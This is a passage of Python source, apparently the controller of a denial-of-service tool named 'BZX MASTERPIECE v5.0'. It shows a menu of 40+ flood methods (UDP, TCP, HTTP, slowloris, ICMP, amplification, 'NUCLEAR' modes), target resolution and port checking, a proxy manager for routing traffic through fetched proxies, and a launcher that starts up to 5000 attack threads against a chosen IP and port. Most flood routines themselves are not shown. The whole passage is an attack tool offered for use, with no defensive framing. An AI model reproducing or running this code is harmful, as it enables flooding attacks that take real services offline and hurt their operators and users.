                lambda: AttackMethods.icmp_flood(self.target_ip, self.packet_size, self._is_running, self.stats, self.lock),
                lambda: AttackMethods.slowloris(self.target_ip, self.target_port, self._is_running, self.stats, self.lock)
            ])()),
        }
    
    def _is_running(self):
        return self.running
    
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_menu(self):
        self.clear_screen()
        print(BANNER)
        
        menu = f"""
{C}┌─────────────────────────────────────────────────────────────────┐
│{W}              BZX MASTERPIECE v5.0 - 40+ ATTACK METHODS           {C}│
├─────────────────────────────────────────────────────────────────┤
│{G} TARGET & CONFIG                     {C}│{G} ATTACK METHODS (40+)        {C}│
├─────────────────────────────────────────────────────────────────┤
│{G}  1. {W}Set Target (IP/Host)          {C}│{G}11-15: {W}UDP Attacks (5)     {C}│
│{G}  2. {W}Set Port                      {C}│{G}16-19: {W}TCP Attacks (4)     {C}│
│{G}  3. {W}Set Threads (1-5000)          {C}│{G}20-27: {W}HTTP Attacks (8)    {C}│
│{G}  4. {W}Set Duration                   {C}│{G}28-32: {W}HTTPS Attacks (5)   {C}│
│{G}  5. {W}Set Packet Size                {C}│{G}33-35: {W}Slow Attacks (3)    {C}│
├─────────────────────────────────────────────────────────────────┤
│{G}  6. {W}Check Target (COMPLETE)       {C}│{G}36-38: {W}ICMP Attacks (3)    {C}│
│{G}  7. {W}PROXY MANAGER                  {C}│{G}39-45: {W}AMP Attacks (7)     {C}│
│{G}  8. {W}Show Target Info               {C}│{G}46-49: {W}NUCLEAR MODES (4)   {C}│
│{G}  9. {W}Test Connection                {C}│{G}                          {C}│
│{G} 10. {W}Show Statistics                {C}│{G}                          {C}│
├─────────────────────────────────────────────────────────────────┤
│{R} 50. 🔥 LAUNCH NUCLEAR ATTACK 🔥      {C}│{G} 51. {W}Stop Attack        {C}│
│{R}  0. Exit                            {C}│{W}                      {C}│
└─────────────────────────────────────────────────────────────────┘{RS}
"""
        print(menu)
        
        proxy_status = f"{G}ON ({len(self.proxy_manager.live_proxies)} live)" if self.use_proxy else f"{R}OFF"
        status = f"{R}☢️ NUCLEAR" if self.running else f"{G}● IDLE"
        print(f"{W}Target: {G}{self.target_ip or 'Not set'} | Port: {self.target_port} | Threads: {self.threads} | Status: {status}{RS}")
        print(f"{W}Proxy: {proxy_status} | Method: {self.attack_name}{RS}")
        
        if self.running:
            elapsed = time.time() - self.start_time
            remaining = max(0, self.duration - elapsed)
            speed = self.stats['packets'] / max(elapsed, 0.1)
            bw = self.stats['bytes'] / 1024 / 1024 / max(elapsed, 0.1)
            print(f"{R}[☢️] {remaining:.0f}s left | Packets: {self.stats['packets']:,} | Speed: {speed:,.0f} pps{RS}")
            print(f"{R}[💾] Bandwidth: {self.stats['bytes']/1024/1024:.2f} MB | {bw:.2f} MB/s{RS}")
    
    def check_target_full(self):
        """Complete target check"""
        if not self.target_ip:
            target = input(f"{Y}Enter target to check: {RS}").strip()
            if not target:
                return
        else:
            target = self.target_ip
            print(f"{Y}[*] Checking target: {target}{RS}")
        
        info = self.target_checker.get_all_info(target)
        
        print(f"\n{C}══════════════ TARGET INFORMATION ══════════════{RS}")
        print(f"{W}Target      : {G}{info['target']}{RS}")
        print(f"{W}Resolved IP : {G}{info['ip'] or 'Failed'}{RS}")
        print(f"{W}Ping        : {G}{'✓' if info['ping'] else '✗'}{RS}")
        print(f"{W}HTTP        : {G}{'✓' if info['http'] else '✗'}{RS}")
        print(f"{W}HTTPS       : {G}{'✓' if info['https'] else '✗'}{RS}")
        print(f"{W}Cloudflare  : {G}{'✓' if info['cloudflare'] else '✗'}{RS}")
        print(f"{W}Server      : {G}{info['server'] or 'Unknown'}{RS}")
        
        print(f"\n{Y}Port Status:{RS}")
        for port, status in info['ports'].items():
            color = G if 'OPEN' in status or 'HTTP' in status else R
            print(f"  Port {port}: {color}{status}{RS}")
        
        if info['ip'] and info['ip'] != self.target_ip:
            set_it = input(f"\n{Y}Use this IP as target? (y/n): {RS}").strip().lower()
            if set_it == 'y':
                self.target_ip = info['ip']
                print(f"{G}[✓] Target set to {self.target_ip}{RS}")
        
        input(f"\n{Y}Press Enter...{RS}")
    
    def proxy_menu(self):
        """Proxy manager menu"""
        while True:
            self.clear_screen()
            print(f"{C}══════════════ PROXY MANAGER ══════════════{RS}")
            print(f"{G}1. Fetch Proxies{RS}")
            print(f"{G}2. Test Proxies (check live){RS}")
            print(f"{G}3. Fetch + Test{RS}")
            print(f"{G}4. Toggle Proxy (current: {self.use_proxy}){RS}")
            print(f"{G}5. Show Stats{RS}")
            print(f"{G}6. Use Fastest Proxy{RS}")
            print(f"{G}7. Clear Proxies{RS}")
            print(f"{R}0. Back{RS}")
            print(f"{C}═══════════════════════════════════════════{RS}")
            
            stats = self.proxy_manager.get_stats()
            print(f"\n{Y}Proxy Stats:{RS}")
            print(f"{W}Total fetched: {G}{stats['total']}{RS}")
            print(f"{W}Live proxies : {G}{stats['live']}{RS}")
            if stats['fastest']:
                print(f"{W}Fastest      : {G}{stats['fastest']}{RS}")
            
            choice = input(f"\n{Y}Choice: {RS}").strip()
            
            if choice == '1':
                self.proxy_manager.fetch_all()
            elif choice == '2':
                if self.proxy_manager.proxies:
                    self.proxy_manager.test_all()
                else:
                    print(f"{R}[!] Fetch first{RS}")
            elif choice == '3':
                self.proxy_manager.fetch_all()
                self.proxy_manager.test_all()
            elif choice == '4':
                self.use_proxy = not self.use_proxy
                print(f"{G}[✓] Proxy {'ON' if self.use_proxy else 'OFF'}{RS}")
            elif choice == '5':
                pass  # Stats already shown
            elif choice == '6':
                fastest = self.proxy_manager.get_proxy(fastest=True)
                if fastest:
                    print(f"{G}[✓] Fastest proxy: {fastest}{RS}")
                else:
                    print(f"{R}[!] No live proxies{RS}")
            elif choice == '7':
                self.proxy_manager.proxies = []
                self.proxy_manager.live_proxies = []
                self.proxy_manager.proxy_speed = {}
                print(f"{G}[✓] Proxies cleared{RS}")
            elif choice == '0':
                break
            time.sleep(1)
    
    def set_attack_method(self, key, name):
        if key in self.attack_methods:
            self.attack_name = name
            self.attack_method = self.attack_methods[key]
            print(f"{G}[✓] Method set to: {name}{RS}")
            return True
        return False
    
    def start_attack(self):
        if not self.target_ip:
            print(f"{R}[!] Set target dulu!{RS}")
            return
        
        if not self.attack_method:
            print(f"{R}[!] Pilih attack method dulu! (11-49){RS}")
            return
        
        self.running = True
        self.stats = {k:0 for k in self.stats}
        self.start_time = time.time()
        
        print(f"\n{R}[☢️] NUCLEAR ATTACK LAUNCHED ON {self.target_ip}:{self.target_port}{RS}")
        print(f"{Y}Threads: {self.threads} | Duration: {self.duration}s | Mode: {self.attack_name}{RS}\n")
        
        for i in range(self.threads):
            t = threading.Thread(target=self.attack_method[1])
            t.daemon = True
            t.start()
        
        try:
            while self.running and (time.time() - self.start_time) < self.duration:
                time.sleep(0.1)
        except KeyboardInterrupt:
            print(f"\n{Y}[!] Attack stopped by user{RS}")
        finally:
            self.stop_attack()
    
    def stop_attack(self):
        self.running = False
        elapsed = time.time() - self.start_time
        print(f"\n{G}[✓] Attack finished in {elapsed:.1f}s{RS}")
        print(f"{G}Total packets: {self.stats['packets']:,}{RS}")
        print(f"{G}Bandwidth: {self.stats['bytes']/1024/1024:.2f} MB{RS}")
        print(f"{G}Average speed: {self.stats['packets']/elapsed:,.0f} pps{RS}")
        
        # Show breakdown
        print(f"\n{Y}Attack breakdown:{RS}")
        for k, v in self.stats.items():
            if k not in ['packets', 'bytes'] and v > 0:
                print(f"{G}{k.upper()}: {v:,}{RS}")
        
        time.sleep(3)
    
    def set_target(self):
        target = input(f"{Y}Target IP/Host/URL: {RS}").strip()
        if not target:
            return
        
        # Quick resolve
        ip, success, method = self.target_checker.resolve_target(target)
        if success:
            self.target_ip = ip
            print(f"{G}[✓] Target resolved: {target} → {ip} ({method}){RS}")
            
            # Auto detect port
            if 'https://' in target:
                self.target_port = 443
                print(f"{G}[✓] Auto set port to 443 (HTTPS){RS}")
            elif 'http://' in target:
                self.target_port = 80
                print(f"{G}[✓] Auto set port to 80 (HTTP){RS}")
        else:
            print(f"{R}[✗] Failed to resolve target{RS}")
        
        time.sleep(1)
    
    def set_port(self):
        try:
            port = int(input(f"{Y}Port (1-65535): {RS}"))
            self.target_port = max(1, min(65535, port))
            print(f"{G}[✓] Port set to {self.target_port}{RS}")
        except:
            print(f"{R}[✗] Invalid port{RS}")
        time.sleep(1)
    
    def set_threads(self):
        try:
            t = int(input(f"{Y}Threads (1-5000): {RS}"))
            self.threads = max(1, min(5000, t))
            print(f"{G}[✓] Threads set to {self.threads}{RS}")
        except:
            print(f"{R}[✗] Invalid number{RS}")
        time.sleep(1)
    
    def set_duration(self):
        try:
            d = int(input(f"{Y}Duration (seconds): {RS}"))
            self.duration = max(1, d)
            print(f"{G}[✓] Duration set to {self.duration}s{RS}")
        except:
            print(f"{R}[✗] Invalid duration{RS}")
        time.sleep(1)
    
    def set_packet_size(self):
        try:
            s = int(input(f"{Y}Packet size (64-65507): {RS}"))
            self.packet_size = max(64, min(65507, s))
            print(f"{G}[✓] Packet size set to {self.packet_size} bytes{RS}")
        except:
            print(f"{R}[✗] Invalid size{RS}")
        time.sleep(1)
    
    def show_target_info(self):
        if not self.target_ip:
            print(f"{R}[!] Set target dulu!{RS}")
            return
        
        info = self.target_checker.get_all_info(self.target_ip)
        print(f"\n{C}══════════════ TARGET INFO ══════════════{RS}")
        print(f"{W}IP Address  : {G}{info['ip']}{RS}")
        print(f"{W}Ping        : {G}{'✓' if info['ping'] else '✗'}{RS}")
        print(f"{W}HTTP        : {G}{'✓' if info['http'] else '✗'}{RS}")
        print(f"{W}HTTPS       : {G}{'✓' if info['https'] else '✗'}{RS}")
        print(f"{W}Cloudflare  : {G}{'✓' if info['cloudflare'] else '✗'}{RS}")
        input(f"\n{Y}Press Enter...{RS}")
    
    def test_connection(self):
        if not self.target_ip:
            print(f"{R}[!] Set target dulu!{RS}")
            return
        
        print(f"{Y}[*] Testing connection to {self.target_ip}:{self.target_port}...{RS}")
        
        # TCP test
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.target_ip, self.target_port))
            sock.close()
            print(f"{G}[✓] TCP connection successful{RS}")
        except Exception as e:
            print(f"{R}[✗] TCP failed: {e}{RS}")
        
        # UDP test
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(b'test', (self.target_ip, self.target_port))
            print(f"{G}[✓] UDP send successful{RS}")
        except:
            print(f"{R}[✗] UDP failed{RS}")
        
        # HTTP test
        try:
            url = f"http://{self.target_ip}:{self.target_port}/"
            r = requests.get(url, timeout=2, verify=False)
            print(f"{G}[✓] HTTP response: {r.status_code}{RS}")
        except:
            print(f"{R}[✗] HTTP request failed{RS}")
        
        time.sleep(1)
    
    def show_stats(self):
        self.clear_screen()
        print(f"{C}══════════════ STATISTICS ══════════════{RS}")
        print(f"{W}Target      : {G}{self.target_ip or 'Not set'}{RS}")
        print(f"{W}Port        : {G}{self.target_port}{RS}")
        print(f"{W}Threads     : {G}{self.threads}{RS}")
        print(f"{W}Duration    : {G}{self.duration}s{RS}")
        print(f"{W}Packet Size : {G}{self.packet_size} bytes{RS}")
        print(f"{W}Method      : {G}{self.attack_name}{RS}")
        print(f"{W}Proxy       : {G}{self.use_proxy} ({len(self.proxy_manager.live_proxies)} live){RS}")
        
        if self.stats['packets'] > 0:
            print(f"\n{Y}Last Attack Stats:{RS}")
            print(f"{W}Packets: {G}{self.stats['packets']:,}{RS}")
            print(f"{W}Bandwidth: {G}{self.stats['bytes']/1024/1024:.2f} MB{RS}")
        
        input(f"\n{Y}Press Enter...{RS}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  MAIN
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def main():
    bzx = BzxMasterpiece()
    
    while True:
        bzx.print_menu()
        choice = input(f"{Y}Select menu [0-51]: {RS}").strip()
        
        # Config menus
        if choice == '1':
            bzx.set_target()
        elif choice == '2':
            bzx.set_port()
        elif choice == '3':
            bzx.set_threads()
        elif choice == '4':
            bzx.set_duration()
        elif choice == '5':
            bzx.set_packet_size()
        elif choice == '6':
            bzx.check_target_full()
        elif choice == '7':
            bzx.proxy_menu()
        elif choice == '8':
            bzx.show_target_info()
        elif choice == '9':
            bzx.test_connection()
        elif choice == '10':
            bzx.show_stats()
        
        # Attack methods (11-49)
        elif choice in [str(i) for i in range(11, 50)]:
            method_name = bzx.attack_methods.get(choice, [None])[0]
            if method_name:
                bzx.set_attack_method(choice, method_name)
            else:
                print(f"{R}[✗] Invalid method{RS}")
        
        # Control
        elif choice == '50':
            bzx.start_attack()
        elif choice == '51':
            bzx.stop_attack()
        elif choice == '0':
            print(f"{R}Exiting...{RS}")
            break
        
        time.sleep(0.5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}Bye!{RS}")
    except Exception as e:
        print(f"{R}Error: {e}{RS}")
